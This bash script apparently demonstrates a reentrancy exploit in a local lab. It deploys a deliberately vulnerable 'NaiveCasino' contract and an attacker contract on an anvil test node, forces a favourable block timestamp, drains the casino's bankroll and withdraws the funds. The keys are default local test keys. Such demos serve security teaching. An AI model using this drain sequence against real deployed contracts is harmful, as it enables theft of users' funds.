#!/usr/bin/env bash
set -euo pipefail

# Reentrancy exploit demo for NaiveCasino, run against a local anvil node.
# Usage:
#   anvil            # in one terminal
#   ./attack.sh      # in another

RPC=http://127.0.0.1:8545

OWNER_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
OWNER_ADDR=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

ATTACKER_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
ATTACKER_EOA=0x70997970C51812dc3A010C7d01b50e0d17dc79C8

HOUSE_BANKROLL=5ether
BET_WEI=1000000000000000000   # 1 ETH
MAX_ROUNDS=50

cd "$(dirname "$0")"

echo "== 1. Deploy NaiveCasino =="
CASINO=$(forge create naive_casino.sol:NaiveCasino \
  --rpc-url "$RPC" --private-key "$OWNER_KEY" --broadcast --json \
  | jq -r .deployedTo)
echo "Casino: $CASINO"

echo "== 2. Fund the house bankroll ($HOUSE_BANKROLL) =="
cast send "$CASINO" --value "$HOUSE_BANKROLL" --rpc-url "$RPC" --private-key "$OWNER_KEY" > /dev/null

echo "== 3. Deploy Attacker pointed at the casino =="
ATTACKER=$(forge create Attacker.sol:Attacker \
  --rpc-url "$RPC" --private-key "$ATTACKER_KEY" --broadcast --json \
  --constructor-args "$CASINO" \
  | jq -r .deployedTo)
echo "Attacker: $ATTACKER"

echo "== 4. Fund the attacker with the bet amount (1 ETH) =="
cast send "$ATTACKER" --value 1ether --rpc-url "$RPC" --private-key "$ATTACKER_KEY" > /dev/null

echo "== Balances before attack =="
echo "Casino:   $(cast balance "$CASINO" --rpc-url "$RPC" --ether) ETH"
echo "Attacker: $(cast balance "$ATTACKER" --rpc-url "$RPC" --ether) ETH"

echo "== 5. Force the next block timestamp to be even (guaranteed win) =="
LATEST_TS=$(cast block latest --rpc-url "$RPC" --field timestamp)
NEXT_EVEN=$(( (LATEST_TS + 2) / 2 * 2 ))
cast rpc evm_setNextBlockTimestamp "$NEXT_EVEN" --rpc-url "$RPC" > /dev/null
echo "Next block timestamp forced to $NEXT_EVEN"

echo "== 6. Run the attack (recursively drains the house via reentrancy) =="
cast send "$ATTACKER" "attack(uint256,uint256)" "$BET_WEI" "$MAX_ROUNDS" \
  --rpc-url "$RPC" --private-key "$ATTACKER_KEY" > /dev/null

echo "== Balances after attack =="
echo "Casino:   $(cast balance "$CASINO" --rpc-url "$RPC" --ether) ETH"
echo "Attacker: $(cast balance "$ATTACKER" --rpc-url "$RPC" --ether) ETH"
echo "Rounds executed: $(cast call "$ATTACKER" "rounds()(uint256)" --rpc-url "$RPC")"

echo "== 7. Withdraw the drained funds to the attacker EOA =="
cast send "$ATTACKER" "withdraw()" --rpc-url "$RPC" --private-key "$ATTACKER_KEY" > /dev/null
echo "Attacker EOA balance: $(cast balance "$ATTACKER_EOA" --rpc-url "$RPC" --ether) ETH"
